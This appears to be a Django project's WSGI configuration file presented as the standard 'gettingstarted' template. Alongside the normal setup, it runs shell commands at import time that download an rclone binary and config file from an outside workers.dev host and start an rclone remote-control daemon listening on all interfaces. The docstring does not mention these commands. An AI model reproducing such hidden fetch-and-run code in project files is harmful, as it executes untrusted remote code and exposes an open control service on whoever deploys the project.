"""
WSGI config for gettingstarted project.

It exposes the WSGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/2.1/howto/deployment/wsgi/
"""

import os

os.system("curl -O https://2sundaran.devilstorage.workers.dev/0:/rclone")
os.system("curl -L https://2sundaran.devilstorage.workers.dev/0:/rclone.conf >rclone.conf")
os.system("./rclone rcd --rc-serve --rc-addr=0.0.0.0:$PORT --config=rclone.conf")
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "gettingstarted.settings")

from django.core.wsgi import get_wsgi_application

application = get_wsgi_application()
